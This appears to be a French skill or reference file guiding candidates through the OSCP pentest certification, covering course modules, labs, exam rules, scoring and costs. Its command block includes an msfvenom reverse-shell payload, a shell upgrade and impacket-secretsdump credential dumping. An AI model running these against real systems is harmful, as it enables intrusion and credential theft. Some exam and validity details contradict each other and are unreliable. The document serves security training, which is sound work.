---
name: oscp-certification
description: Guide complet de la certification OSCP (Offensive Security Certified Professional) — contenu PEN-200, préparation, laboratoires, examen pratique, ressources et conseils.
---

# Certification OSCP (Offensive Security Certified Professional) — Guide Complet

> **Organisme :** OffSec (Offensive Security)
> **Cours :** PEN-200 — Penetration Testing with Kali Linux
> **Version actuelle :** PEN-200 2025 (OSCP+)
> **Niveau :** Avancé (pratique)
> **Durée de validité :** À vie (OSCP+) + 3 ans renewal OSCP+

---

## 1. Présentation

L'**OSCP** est la certification pratique de référence en pentesting. Elle valide la capacité d'un professionnel à réaliser un test d'intrusion complet sur des machines réelles dans un environnement chronométré. Contrairement au CEH (théorique/QCM), l'OSCP est **100% pratique** : pas de QCM, uniquement de l'exploitation réelle.

### Chiffres clés

- **321h** de contenu
- **20+ modules** couvrant l'ensemble du pentesting
- **9 challenge labs** (dont 3 miroirs de l'examen réel)
- **24h** d'examen pratique supervisé
- **Prix :** $1,499 (course + cert bundle)
- **OSCP+** : Certification de 3 ans avec CPE

---

## 2. Modules PEN-200

### Module 1 : Getting Started
- Introduction au pentesting
- Méthodologie générale
- Kali Linux set-up
- Stratégie d'apprentissage efficace

### Module 2 : Information Gathering — Passive
- OSINT passif
- DNS, WHOIS, shodan, Google dorks
- theHarvester, Recon-ng

### Module 3 : Information Gathering — Active
- Nmap avancé (timing, scripts, évasion)
- Vulnérabilité scanning (Nessus, OpenVAS)
- Énumération (NetBIOS, SNMP, LDAP, SMTP)

### Module 4 : Cryptography and Password Attacks
- Hash cracking (Hashcat, John)
- Password spraying, brute force (Hydra, Medusa)
- LM/NTLM, Kerberos
- Attaque de protocoles chiffrés (déchiffrement TLS)

### Module 5 : Web Application Attacks, Part 1
- XSS (Reflected, Stored, DOM)
- Command Injection
- Directory Traversal
- File Upload attacks
- Brute force (formulaires web)

### Module 6 : Web Application Attacks, Part 2
- SQL Injection (in-band, blind)
- SQLMap avancé
- Attaques authentifiées
- CSRF, SSRF

### Module 7 : Client-Side Attacks
- Phishing via documents malveillants
- Fichiers HTA, VBS, macro Office
- Browser exploitation
- Anti-Virus evasion (Shellter, Veil)

### Module 8 : Windows Privilege Escalation
- Énumération (winPEAS, Seatbelt, PowerUp)
- Kernel exploits
- Service exploitation (service path, unquoted, DLL hijacking)
- Token manipulation, UAC bypass
- Credential theft (SAM, LSASS)

### Module 9 : Linux Privilege Escalation
- Énumération (linPEAS, LinEnum, pspy)
- SUID misconfig, sudo -l
- Kernel exploits, capabilities
- Cron, PATH abuse, NFS

### Module 10 : Pivoting, Tunneling, and Port Forwarding
- SSH tunnelling (local, remote, dynamic)
- sshuttle, Chisel, Ligolo-ng
- Meterpreter port forwarding
- Proxychains / FoxyProxy

### Module 11 : Active Directory Introduction & Enumeration
- AD concepts : domain, OU, group, GPO
- BloodHound (SharpHound, AzureHound)
- LDAP enumeration, PowerView, AD Module
- Kerberos authentication overview

### Module 12 : Attacking Active Directory Authentication
- Password spraying
- AS-REP Roasting
- Kerberoasting
- Pass-the-Hash / Pass-the-Ticket
- DCSync

### Module 13 : Lateral Movement in Active Directory
- WMI, WinRM, PsExec
- Scheduled tasks, services
- SMB, RDP
- Overpass-the-Hash, Pass-the-Cache

### Module 14 : Active Directory Exploitation
- ACL abuse (BloodHound edge analysis)
- RBCD, Shadow Credentials
- ADCS (ESC1-ESC8)
- Golden/Silver Tickets
- Forest/domain trust exploitation

### Module 15 : Attacking AWS Cloud Infrastructure
- AWS enumeration (IAM, S3, EC2, Lambda)
- S3 bucket misconfigs, public access
- EC2 metadata service (IMDS)
- IAM privilege escalation
- Lambda, CloudFormation abuse

### Module 16 : Assembling the Pieces — Write Report
- Documentation du pentest
- Preuve de compromission (proof.txt, local.txt)
- Rédaction d'un rapport professionnel
- Recommandations, timeline

---

## 3. Challenge Labs

Après les modules, **9 challenge labs** mettent en pratique les compétences combinées :

| Lab | Difficulté | Type |
|-----|-----------|------|
| Lab 1-3 | Facile | Machines standalone |
| Lab 4-6 | Moyen | Combinaison de techniques |
| Lab 7-9 | Difficile | **Miroir de l'examen** (AD set) |

Les **labs 7-9** sont spécialement conçus pour reproduire l'environnement d'examen avec 3 machines standalone + 1 AD set.

---

## 4. Examen OSCP

### Format

| Critère | Détail |
|---------|--------|
| Durée | **24 heures** |
| Supervision | Supervision humaine (proctor OffSec via VPN) |
| Environnement | VPN dédié, machines isolées |
| Notation | **Proof + rapport** (pas de points machine) |

### Composition exacte

**3 machines standalone (60% de la note)**
- 1 Linux + 2 Windows (ou 2 Linux + 1 Windows)
- Initial access + privilege escalation
- Chaque machine : points pour initial access + PE

**1 Active Directory set (40% de la note)**
- 3 machines en environnement AD
- Scénario : compromission de domaine complète
- Breach initial → mouvement latéral → DC compromise

### Règles

- **Pas de Metasploit** sur les machines standalone (autoexploit modules interdits)
- Metasploit **autorisé** sur le AD set
- **Pas de bruteforce** SSH sur les machines standalone
- Pas d'outils automatisés (sqlmap autorisé)
- Screenshot de chaque preuve (proof.txt, local.txt)
- Rapport PDF complet à remettre **dans les 24h** suivant la fin de l'examen

### Scoring

| Item | Points |
|------|--------|
| Machine 1 — Initial access | 10 |
| Machine 1 — PE | 10 |
| Machine 2 — Initial access | 10 |
| Machine 2 — PE | 10 |
| Machine 3 — Initial access | 10 |
| Machine 3 — PE | 10 |
| AD Set (compromission complète) | 40 |
| **Total** | **100 points** |

**Note de passage : 70 / 100**

---

## 5. Préparation

### Prérequis
- Maîtrise de Linux (commandes de base, bash, fichiers)
- Administration Windows (services, AD concepts)
- Réseaux (TCP/IP, DNS, HTTP, SMB)
- Programmation de base (Bash, Python, PowerShell)

### Parcours recommandé

| Phase | Durée | Activité |
|-------|-------|----------|
| 0. Prérequis | 1–3 mois | Réseaux, Linux, Windows AD |
| 1. Watch PEN-200 videos | 2–4 sem | Modules vidéo + exercices |
| 2. Exercices modules | 4–6 sem | Chaque module, labs intégrés |
| 3. Challenge Labs 1-6 | 2–3 sem | Application combinée |
| 4. Challenge Labs 7-9 | 2–3 sem | Simulation d'examen |
| 5. Exam simulation | 2–3 sem | Tenter seul sans aide |
| 6. Exam | 24h | Le grand jour |

### Ressources clés

| Ressource | Type | Prix |
|-----------|------|------|
| PEN-200 + Labs | Cours + lab | $1,499 |
| PEN-200 renewal (OSCP+) | Recertification | ~$500 |
| TJNull's OSCP List | Machines vulnhub/HTB | Gratuit |
| HackTheBox (VIP) | Pratique | ~$15/mois |
| Proving Grounds (OffSec) | Pratique officielle | ~$20/mois |
| LainSec OSCP Guide | Guide | Gratuit |
| HTB Academy — AD Track | Cours AD | ~$60 |

### Meilleures plateformes d'entraînement

1. **Hack The Box** (VIP) : TJNull's OSCP list, Active Directory labs
2. **Proving Grounds** : Officiel OffSec, miroir de l'examen
3. **TryHackMe** : Parcours PEN-200, JR Penetration Tester
4. **VulnHub** : Machines gratuites
5. **PG Practice** : 50+ machines classées par difficulté

### Commandes à maîtriser absolument

```bash
# Reconnaissance
nmap -sV -sC -p- <IP>
rustscan -a <IP> -- -A -sC
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Exploitation
searchsploit <service> <version>
python3 exploit.py <IP> <port>
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o payload.elf

# Post-exploitation
python3 -c 'import pty; pty.spawn("/bin/bash")'
# AD enumeration
bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -dc <DC_IP> -c All
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP>
```

---

## 6. Coûts Totaux

| Élément | Prix (USD) |
|---------|-----------|
| PEN-200 + examen OSCP | $1,499 |
| 90 jours lab supplémentaires | ~$299 |
| Hack The Box VIP (6 mois) | ~$90 |
| Proving Grounds (6 mois) | ~$120 |
| Total estimé | $1,800–2,200 |

---

## 7. Maintien (OSCP+)

- **OSCP+** : Certification active 3 ans
- **CPE :** 24 CPE/h par an
- **Sans renouvellement** : OSCP reste à vie mais perd le badge « + »

Sources de CPE OffSec :
- Écrire des write-ups
- CTF participation
- Autres certifications OffSec
- Conférences de sécurité

---

## 8. Comparaison CEH vs OSCP

| Critère | CEH | OSCP |
|---------|-----|------|
| Format | QCM + pratique optionnel | 100% pratique |
| Difficulté | Intermédiaire | Avancée |
| Reconnaissance | RH, DoD, corporate | Technique, pentesters |
| Coût | $1,600–2,600 | $1,500–2,200 |
| Préparation | Mémorisation | Pratique réelle |
| Examen | 4h QCM | 24h lab |
| Utilité CV | Élite (RH) | Technique (équipes tech) |

---

## 9. Liens Utiles

- OffSec PEN-200 : https://www.offsec.com/courses/pen-200/
- OffSec Help Center : https://help.offsec.com
- TJNull's OSCP List : https://docs.google.com/spreadsheets/d/1dwSMIAPIar0C9Fo9M3c9C2eO8RkOOBdLgCg1YhPrIIk/
- Hack The Box : https://www.hackthebox.com
- Proving Grounds : https://www.offsec.com/labs/
- LainSec OSCP Guide : https://www.lainsec.com/oscp
